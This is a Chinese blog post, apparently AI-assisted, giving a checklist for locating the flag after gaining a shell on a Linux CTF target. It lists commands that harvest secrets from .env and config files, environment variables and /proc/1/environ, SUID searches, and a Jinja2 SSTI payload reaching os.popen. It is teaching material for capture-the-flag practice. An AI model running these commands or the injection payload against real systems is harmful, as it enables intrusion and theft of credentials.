---
title: "拿到shell要干的事情(ai)"
image: ''
pinned: false
comment: true
published: 2026-05-26
updated: 2026-05-26
description: "111111"
category: 学习
tags: [学习]
---

# Linux 靶机拿到 shell 后寻找 flag 流程

## 1. 先确认当前环境

拿到命令执行后，不要一上来就乱 `find /`，先确认当前用户、目录、权限。

```
id
whoami
pwd
ls -la
```

作用：

```
id / whoami     查看当前用户权限
pwd             查看当前目录
ls -la          查看当前目录下有没有隐藏文件
```

如果当前目录下有源码，先读源码：

```
cat app.py
cat *.py
cat *.sh
```

很多 Web 题的 flag 路径可能写在源码、配置文件、环境变量里。

------

## 2. 先查常见 flag 位置

CTF 靶机里 flag 最常见的位置：

```
ls -la /
cat /flag
cat /flag.txt
cat /f*
```

也可以看看根目录完整内容：

```
ls -la /
```

如果看到奇怪文件名，比如：

```
/flag_is_here
/readflag
/this_is_flag
```

直接读：

```
cat /文件名
```

------

## 3. 查 Web 项目目录

常见 Web 项目目录有：

```
ls -la /app
ls -la /var/www
ls -la /var/www/html
ls -la /home
ls -la /tmp
```

可以逐个试：

```
find /app -maxdepth 3 -type f 2>/dev/null
find /var/www -maxdepth 3 -type f 2>/dev/null
find /home -maxdepth 3 -type f 2>/dev/null
find /tmp -maxdepth 3 -type f 2>/dev/null
```

如果发现配置文件：

```
cat config.py
cat .env
cat settings.py
cat docker-compose.yml
```

重点看里面有没有：

```
FLAG
flag
SECRET
TOKEN
password
```

------

## 4. 用文件名搜索 flag

最基础：

```
find / -name "*flag*" 2>/dev/null
```

更完整一点：

```
find / -iname "*flag*" 2>/dev/null
find / -iname "*ctf*" 2>/dev/null
find / -iname "*secret*" 2>/dev/null
find / -iname "*key*" 2>/dev/null
```

如果根目录太大，可以限制深度：

```
find / -maxdepth 3 -type f 2>/dev/null
```

如果怀疑 flag 是随机文件名：

```
find / -maxdepth 2 -type f 2>/dev/null
```

------

## 5. 查环境变量

很多 Docker 靶机直接把 flag 放在环境变量里。

```
env
printenv
```

然后重点看有没有：

```
FLAG=
flag=
CTF=
SECRET=
```

有些时候 `env` 看不到，可以读进程环境变量：

```
cat /proc/self/environ | tr '\0' '\n'
cat /proc/1/environ | tr '\0' '\n'
```

这里很重要：

```
/proc/self/environ
```

是当前命令进程的环境变量。

```
/proc/1/environ
```

是 1 号进程的环境变量。Docker 容器里 1 号进程通常就是题目主服务进程，所以 flag 很可能藏在这里。

------

## 6. 查进程和文件描述符

先看进程：

```
ps aux
ps -ef
```

如果看到主进程是：

```
python app.py
```

可以继续看它的工作目录：

```
readlink /proc/1/cwd
ls -la /proc/1/cwd
```

看它打开了哪些文件：

```
ls -la /proc/1/fd
```

如果里面有可疑 fd，比如：

```
3 -> /flag
4 -> /tmp/xxx
```

可以读：

```
cat /proc/1/fd/3
cat /proc/1/fd/4
```

这就是你之前问的 `/proc/1/fd/3` 那类思路。

------

## 7. 搜索文件内容

如果文件名不带 flag，可以搜内容。

先小范围搜：

```
grep -R "flag" /app 2>/dev/null
grep -R "ctf" /app 2>/dev/null
grep -R "FLAG" /app 2>/dev/null
```

再扩大到常见目录：

```
grep -R "flag" /home /tmp /var/www /app 2>/dev/null
```

如果题目 flag 格式明确，比如 `flag{}`、`NSSCTF{}`、`BUUCTF{}`、`ISCTF{}`，直接搜格式：

```
grep -R "flag{" / 2>/dev/null
grep -R "NSSCTF{" / 2>/dev/null
grep -R "BUUCTF{" / 2>/dev/null
grep -R "ISCTF{" / 2>/dev/null
```

------

## 8. 查隐藏文件

很多题会把 flag 放在隐藏文件里：

```
ls -la /
ls -la /app
ls -la /home
ls -la /tmp
```

重点关注：

```
.flag
.flag.txt
.env
.secret
```

读取：

```
cat /.flag
cat /app/.flag
cat /app/.env
```

------

## 9. 查权限特殊文件

有些题需要通过可执行程序读 flag，比如 `readflag`。

```
find / -perm -4000 -type f 2>/dev/null
find / -name "readflag" 2>/dev/null
```

如果发现：

```
/readflag
```

可以执行：

```
/readflag
```

或者：

```
./readflag
```

------

## 10. 推荐实际执行顺序

拿到 shell 后，我一般按这个顺序跑：

```
id
pwd
ls -la
cat app.py
ls -la /
cat /flag
cat /flag.txt
cat /f*
env
cat /proc/1/environ | tr '\0' '\n'
ps aux
readlink /proc/1/cwd
ls -la /proc/1/fd
find / -maxdepth 3 -type f 2>/dev/null
find / -iname "*flag*" 2>/dev/null
find / -iname "*secret*" 2>/dev/null
grep -R "flag{" /app /home /tmp /var/www 2>/dev/null
```

------

## 11. Fenjing 里对应操作

你这个题里可用的命令执行链是：

```
{{(QAQ.__eq__.__globals__.sys.modules.os.popen('命令')).read()}}
```

所以 Fenjing shell 里直接输入：

```
ls -la /
env
cat /proc/1/environ | tr '\0' '\n'
ls -la /proc/1/fd
cat /proc/1/fd/3
```

如果是手动拼 payload，就把命令放进 `popen()` 里面即可。

------

# 总结一句话

拿到 Linux shell 后找 flag 的核心顺序是：

```
当前目录 → 根目录 → Web 项目目录 → 环境变量 → /proc/1 → 文件名搜索 → 内容搜索 → SUID/readflag
```

这套流程基本能覆盖大多数 Web/SSTI/RCE 类 CTF 靶机。

---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
